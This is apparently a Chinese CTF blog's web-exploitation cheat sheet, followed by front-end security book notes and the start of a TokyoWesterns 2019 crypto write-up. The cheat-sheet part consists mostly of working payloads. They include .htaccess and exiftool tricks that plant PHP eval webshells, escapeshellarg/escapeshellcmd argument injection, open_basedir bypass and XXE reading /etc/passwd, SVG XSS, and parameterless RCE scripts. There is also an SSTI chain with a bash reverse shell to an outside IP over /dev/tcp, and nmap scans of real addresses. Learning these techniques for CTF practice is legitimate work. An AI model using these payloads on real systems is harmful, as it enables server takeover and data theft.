<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h4 id="本地文件上传表单"><a href="#本地文件上传表单" class="headerlink" title="本地文件上传表单"></a>本地文件上传表单</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://9eb98e8b639143b7ba4a127e107fd49228a475abf67843f3.game.ichunqiu.com/blog_manage/manager.php?module=manager&amp;name=php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> <span class="attr">id</span>=<span class="string">"Upload"</span> <span class="attr">value</span> = <span class="string">"Upload"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h2><p>常用后缀</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phpt, pht</span><br></pre></td></tr></table></figure>

<h2 id="00-截断"><a href="#00-截断" class="headerlink" title="00 截断"></a>00 截断</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">move_uploaded_file($FILE[&apos;tmp_name&apos;],&apos;evil.php%00.gif&apos;);</span><br></pre></td></tr></table></figure>

<h2 id="php文件自包含导致内存溢出"><a href="#php文件自包含导致内存溢出" class="headerlink" title="php文件自包含导致内存溢出"></a>php文件自包含导致内存溢出</h2><p>这里使用一道题目的思路</p>
<p><img src="https://user-images.githubusercontent.com/40637063/59276577-27f49e00-8c91-11e9-9ae4-c1f193fede3c.png" alt="image"></p>
<p>使用前提: 知道tmp目录下的文件名字</p>
<p>上传普通png, 利用exiftool生成木马png之后上传, 随后用.show或者.win格式去读取这个png文件才会触发漏洞, 否则无法使用</p>
<h2 id="htaccess-攻击"><a href="#htaccess-攻击" class="headerlink" title=".htaccess 攻击"></a>.htaccess 攻击</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>将它发送到服务端之后, .png后缀的文件就会被当作php文件来进行解释. </p>
<p>解释一下下面这个.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value include_path &quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">#\</span><br></pre></td></tr></table></figure>

<ul>
<li>第一行: 将include包含路径设定为UTF-7编码的phpshell,这是因为默认情况下error_log 中的内容是html编码过的,所以箭头符号会被编码.</li>
<li>第二行 将报告错误的等级设置为最高,报告所有的可能出现的错误（不同的PHP版本，常量E_ALL的值也可能不同）</li>
<li>第三行,将错误报告的路径设置到/tmp/fl3g.php中</li>
<li>第四行,场景: 如果上述内容在写入htaccess中的时候还额外添加了什么无意义的字符串,斜杠可以将无意义字符串开头的换行符号去掉,同时井号可以将当前行注释掉,否则无意义字符串的存在会导致.htaccess解析失败.</li>
</ul>
<p>解释一下这个.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value include_path &quot;/tmp&quot;</span><br><span class="line">#\</span><br></pre></td></tr></table></figure>

<ul>
<li>第一行,关于zend.multibytes,官方解释是这样的</li>
</ul>
<blockquote>
<p>Enables parsing of source files in multibyte encodings. Enabling zend.multibyte<br>is required to use character encodings like SJIS, BIG5, etc that contain special<br>characters in multibyte string data. ISO-8859-1 compatible encodings like UTF-8,<br>EUC, etc do not require this option.</p>
</blockquote>
<ul>
<li>第二行,关于zend.script_encoding, 官方解释</li>
</ul>
<blockquote>
<p>​         This value will be used unless a         <a href="https://www.php.net/manual/en/control-structures.declare.php#control-structures.declare.encoding" target="_blank" rel="noopener">declare(encoding=…)</a>         directive appears at the top of the script. When ISO-8859-1 incompatible encoding         is used, both zend.multibyte and zend.script_encoding must be used.        </p>
<p>​         Literal strings will be transliterated from zend.script_enconding to         mbstring.internal_encoding, as if         <a href="https://www.php.net/manual/en/function.mb-convert-encoding.php" target="_blank" rel="noopener">mb_convert_encoding()</a> would have been called.        </p>
</blockquote>
<p>UTF-7 不是ISO标准里面的,所以两个都要用上.</p>
<ul>
<li>第三行设定php在包含文件的时候搜索的路径,这里设置为在/tmp下面,因此有机会的话可以把shell写到/tmp下面.</li>
<li>第四行一样,注释用</li>
</ul>
<h2 id="本地文件上传表单-1"><a href="#本地文件上传表单-1" class="headerlink" title="本地文件上传表单"></a>本地文件上传表单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xxxxx/x.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="imagemagick-漏洞"><a href="#imagemagick-漏洞" class="headerlink" title="imagemagick 漏洞"></a>imagemagick 漏洞</h2><p>场景:在phpinfo中发现imagick选项开启</p>
<p><a href="https://www.2cto.com/article/201605/505823.html" target="_blank" rel="noopener">CVE漏洞</a></p>
<p>两种上传选项</p>
<ul>
<li><p>.mvg内容格式图片(图片名不一定包含.mvg, test.gif也可以)</p>
</li>
<li><p>png格式文件, 但是必须要以.show或者.win方式来处理读取才能触发其中的代码, payload产生如下</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[x\]\)\;?\&gt; &gt; </span><br><span class="line">/opt/lampp/htdocs/uploads/x.php; \&quot;&quot; 20161113150830.png</span><br></pre></td></tr></table></figure>

<p>这里转义是因为这是要在命令行中执行的, 要把我们要写入文件的关键字符进行一次转义, $前面的两个转义符号是因为在写入图片的时候会去掉一个命令行里面又会去掉一个.</p>
</li>
</ul>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><blockquote>
<p>PHP 在读写文件的时候需要打开文件流，会把路径标准化为绝对路径。</p>
<p>但是在删除或者重命名的时候，不会打开文件流，文件名除了前缀以外的位置如果还含有路径，就会删除失败。</p>
</blockquote>
<p>对于<code>xxx.php/.</code>在move_uploaded_file()处理的时候，会转化为绝对路径,将xxx.php保存。</p>
<p>但是unlink()删除失败，xxx.php就被保存了下来。</p>
<h2 id="php弱比较"><a href="#php弱比较" class="headerlink" title="php弱比较"></a>php弱比较</h2><p>一个例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;0a&apos; == 0</span><br></pre></td></tr></table></figure>

<p>这在php中成立</p>
<h2 id="escapeshellcmd-escapeshellarg"><a href="#escapeshellcmd-escapeshellarg" class="headerlink" title="escapeshellcmd  escapeshellarg"></a>escapeshellcmd  escapeshellarg</h2><p>escapeshellarg 定义</p>
<blockquote>
<p>给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p>
</blockquote>
<p>escapeshellcmd  </p>
<blockquote>
<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到<br>exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\）会在以下字符之前插入：<br>&amp;#;`|?~&lt;&gt;^()[]{}$*, \x0A 和 \xFF。 ’ 和 “仅在不配对的时候被转义。 在 Windows<br>平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
</blockquote>
<p>先使用arg后使用cmd会导致一些问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG cmd.php &apos;</span><br><span class="line">//经过arg处理,给单引号转移然后对两侧的部分都添加一对单引号</span><br><span class="line">&apos;\&apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG cmd.php \&apos;&apos;</span><br><span class="line">//经过cmd处理,各种转义,忽略成对的单引号</span><br><span class="line">&apos;\\&apos;\&lt;\?php @eval($_POST[&quot;cmd&quot;]);\?\&gt; -oG cmd.php \\&apos;&apos;</span><br></pre></td></tr></table></figure>

<h2 id="无数字字母shell"><a href="#无数字字母shell" class="headerlink" title="无数字字母shell"></a>无数字字母shell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;&#125;花括号中的代码会被执行,说白了就是可变变量.</span><br><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;[%A0]();&amp;%A0=get_the_flag</span><br><span class="line">或者</span><br><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0=get_the_flag</span><br><span class="line">由于在花括号中,异或会执行,结果是_GET,最终结果是$_GET&#123;%A0&#125;();&amp;%A0=get_the_flag</span><br></pre></td></tr></table></figure>

<h2 id="chdir来绕过open-basedir"><a href="#chdir来绕过open-basedir" class="headerlink" title="chdir来绕过open_basedir"></a>chdir来绕过open_basedir</h2><p>如果可以执行命令但是收到了open_basedir的阻碍.可以通过以下命令来改变open_basedir</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir(&quot;/tmp/fuck&quot;);chdir(&apos;/tmp/fuck/&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(file_get_contents(&quot;/etc/passwd&quot;));</span><br></pre></td></tr></table></figure>

<h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><p>标志:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">正则过滤:</span><br><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_rand(array_flip(getenv()))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">end(getallheaders())</span><br><span class="line">// add your payload to the end of your request headers</span><br><span class="line">// 中间件不是apache的时候失效</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())))&amp;sky=phpinfo;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用全局变量FILE, 用于GET被全局过滤的情况</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('ls /tmp');"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">files = &#123;</span><br><span class="line">  payload: BytesIO(<span class="string">'sky cool!'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#利用全局变量COOKIE</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/?code=eval(hex2bin(session_id(session_start())));'</span></span><br><span class="line">payload = <span class="string">"echo 'sky cool';"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line">	<span class="string">'PHPSESSID'</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure>

<p>退而求其次, 仅仅要读取文件的话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line">?code=var_dump(scandir(dirname(getcwd())));</span><br><span class="line">?code=chdir(dirname(getcwd()));</span><br><span class="line">// 读/var/www下的东东</span><br><span class="line">?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">// 读根目录下的东东</span><br><span class="line">?code=var_dump(file_get_contents(array_rand(array_flip(scandir(dirname(dirname(chdir(dirname(dirname(chdir(dirname(getcwd()))))))))))));</span><br></pre></td></tr></table></figure>

<blockquote>
<p>经过测试, 似乎读文件的时候必须chdir到同级目录下</p>
</blockquote>
<p>array_reverse是改变数组顺序的, [1,2,3]变成[3,2,1]</p>
<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="svg-上传"><a href="#svg-上传" class="headerlink" title="svg 上传"></a>svg 上传</h2><blockquote>
<p>SVG 图像是矢量图像，可以无限缩放，而且在图像质量下降方面没有任何问题。为什么会这样呢？因为 SVG 图像是使用 XML 标记构建的，浏览器通过绘制每个点和线来打印它们，而不是用预定义的像素填充某些空间。这确保 SVG 图像可以适应不同的屏幕大小和分辨率，即使是那些尚未发明的。<br>由于是在 XML 中定义的，SVG 图像比 JPG 或 PNG 图像更灵活，而且我们可以使用 CSS 和 JavaScript 与它们进行交互。SVG 图像设置可以包含 CSS 和 JavaScript。<br>svg是在xml中定义的，所以可以执行xml代码，在xml代码里面嵌入css和js代码执行即可。</p>
</blockquote>
<p>要求发送的请求格式： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: image/svg+xml</span><br></pre></td></tr></table></figure>

<p>svg文件payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>svg来源于xml也就是说遵循xml的规则,在xml的规则中,html实体编码将会被自动还原,比如以下的例子</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;可以执行</span><br><span class="line">&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;不能执行</span><br></pre></td></tr></table></figure>

<h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><p>常规payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure>

<p>注意在发送请求包的时候要将Content-Type的值修改为application/xml否则本地将无法理解将要发送的数据包.</p>
<p>rss也是xml. rss订阅可能会有xxe漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">    &lt;title&gt;The Blog&lt;/title&gt;</span><br><span class="line">    &lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">    &lt;description&gt;A blog about things&lt;/description&gt;</span><br><span class="line">    &lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">    &lt;item&gt;</span><br><span class="line">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">        &lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">        &lt;description&gt;a post&lt;/description&gt;</span><br><span class="line">        &lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">        &lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">    &lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h1 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h1><p>一些预备知识:</p>
<ul>
<li>http请求头中的Vary和web请求路径共同形成键值, 不同的键值将会命中不同的缓存, 比如Vary: User-Agent 将导致在请求路径相同的情况下火狐用户和IE用户以及chrome用户会分别得到不同的响应内容</li>
</ul>
<p><a href="[https://www.smi1e.top/%e9%80%9a%e8%bf%87%e4%b8%80%e9%81%93%e9%a2%98%e4%ba%86%e8%a7%a3%e7%bc%93%e5%ad%98%e6%8a%95%e6%af%92%e5%92%8csvg-xss/](https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/">通过一道题目了解缓存投毒</a></p>
<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>官方payload 执行命令: id</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;%20&#123;%%20if%20c.__name__%20==%20%27catch_warnings%27%20%&#125;%20&#123;%%20for%20b%20in%20c.__init__.__globals__.values()%20%&#125;%20&#123;%%20if%20b.__class__%20==%20&#123;&#125;.__class__%20%&#125;%20&#123;%%20if%20%27eval%27%20in%20b.keys()%20%&#125;%20&#123;&#123;%20b[%27eval%27](%27__import__(%22os%22).popen(%22id%22).read()%27)%20&#125;&#125;%20&#123;%%20endif%20%&#125;%20&#123;%%20endif%20%&#125;%20&#123;%%20endfor%20%&#125;%20&#123;%%20endif%20%&#125;%20&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("bash -c \'sh -i &amp;&gt;/dev/tcp/39.105.176.37/12334 0&gt;&amp;1\'")'</span>)</span><br></pre></td></tr></table></figure>

<p>绕过的好方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://49.232.103.198:57666/render?data=&#123;&#123;%22%22|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(77)|attr(request.args.init)|attr(request.args.glo)|attr(request.args.ae)(%22popen%22)(%22ls%22)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;glo=__globals__&amp;ae=__getitem__&amp;re=read</span><br></pre></td></tr></table></figure>

<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80 39.105.176.37</span><br><span class="line">nmap -p 22,80 39.105.176.1-53</span><br><span class="line">nmap 192.168.31.1/24</span><br><span class="line"></span><br><span class="line">nmap -sV 39.105.176.37 -p 8000</span><br><span class="line"></span><br><span class="line">nmap -O 39.105.176.37</span><br><span class="line"></span><br><span class="line">nmap -A 39.15.176.37</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>web前端黑客技术揭秘-读书笔记[working]</title>
    <url>/2019/09/07/web%E5%89%8D%E7%AB%AF%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>很多网站会通过iframe来引入第三方内容比如广告,第三方web游戏和应用.</p>
<p>约定网页是父页而iframe中的是子页. 如果父页和子页同源,那么可以通过contentWindow来操作彼此的DOM树, 否则同源策略会禁止双方对彼此的资源读写. 但是<code>子页还是可以对父页的location值进行写操作,这样可以让父页重定向到其他网页</code> 但是对location是没有读权限的, 因为有些隐私信息会存在父页的url中, 这样做可以避免隐私泄露.</p>
<h3 id="请求头响应头和javascript"><a href="#请求头响应头和javascript" class="headerlink" title="请求头响应头和javascript"></a>请求头响应头和javascript</h3><p>不是任何请求头都可以通过javascript来设置.同时, 不是所有响应头都是可以被客户端脚本读取的, 其中就有设置了HttpOnly的Set-Cookie/Set-Cookie2, 这是严禁客户端脚本读取的.</p>
<h3 id="HttpOnly-Cookie-读取"><a href="#HttpOnly-Cookie-读取" class="headerlink" title="HttpOnly Cookie 读取"></a>HttpOnly Cookie 读取</h3><p>在apache的历史版本里面,http请求长度超过LimitRequestFieldSize长度的时候, 服务器返回400错误并在返回消息中将出错的请求头内容输出, 其中就包括了httponly cookie</p>
<h3 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h3><p>Ajax是严格遵循同源策略的, 既不能从另一个域读取数据也不能向他发送数据. 但是有一种场合除外, <a href="http://www.foo.com" target="_blank" rel="noopener">www.foo.com</a> 向<a href="http://www.evil.com" target="_blank" rel="noopener">www.evil.com</a> 发送数据的时候带上请求头Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a> . 同时目标域来判断这个域名是否在白名单中,如果是就返回响应头Access-Control-Allow-Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a> 表示同意跨域. 如果值是通配符*, 表示任何域都可以发送数据过来.</p>
<p>如果不返回响应头, 浏览器就会报权限错误.然而, 实际上数据已经被目标域给接受了.但是这样的跨域无法带上会话信息, 除非设置withCreadentials属性为true.</p>
<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p>一般的content-type为application/x-www-form-urlencoded, 如果是上传文件就一般为 multipart/form-data</p>
<h3 id="利用E4X来混淆javascript代码"><a href="#利用E4X来混淆javascript代码" class="headerlink" title="利用E4X来混淆javascript代码"></a>利用E4X来混淆javascript代码</h3><p>将javascript代码放入xml数据中 比如x=&lt;&gt;alert(‘htllo’)&lt;/&gt;, 但是这样子不能自执行, 需要eval(x).要达到自我执行, 就这样写x=&lt;&gt;{alert(‘hello’)}&lt;/&gt;, 表示里面是要执行的脚本.</p>
]]></content>
  </entry>
  <entry>
    <title>TokyoWestern2019</title>
    <url>/2019/09/04/TokyoWestern2019/</url>
    <content><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="simple-logic"><a href="#simple-logic" class="headerlink" title="simple logic"></a>simple logic</h2><p>题目给出了加密脚本</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line">PAIRS = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg, key)</span></span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    ROUNDS.times <span class="keyword">do</span></span><br><span class="line">        enc = (enc + key) &amp; mask</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    enc</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(msg, key)</span></span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    ROUNDS.times <span class="keyword">do</span></span><br><span class="line">        enc = enc ^ key</span><br><span class="line">        enc = (enc - key) &amp; mask</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    enc</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">fail <span class="keyword">unless</span> BITS % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line">key = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">STDERR.puts <span class="string">"The flag: TWCTF&#123;%x&#125;"</span> % flag</span><br><span class="line">STDERR.puts <span class="string">"Key=%x"</span> % key</span><br><span class="line">STDOUT.puts <span class="string">"Encrypted flag: %x"</span> % encrypt(flag, key)</span><br><span class="line">fail <span class="keyword">unless</span> decrypt(encrypt(flag, key), key) == flag <span class="comment"># Decryption Check</span></span><br><span class="line"></span><br><span class="line">PAIRS.times <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    plain = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line">    enc = encrypt(plain, key)</span><br><span class="line">    STDOUT.puts <span class="string">"Pair %d: plain=%x enc=%x"</span> % [-~i, plain, enc]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>随后给出了加密过后的flag以及随机产生的六组明文和对应的六组密文.</p>
<p>加密过程就是明文和key相加之后在和key进行一次异或, 这个过程重复765次. 很明显我们要求key来解出flag</p>
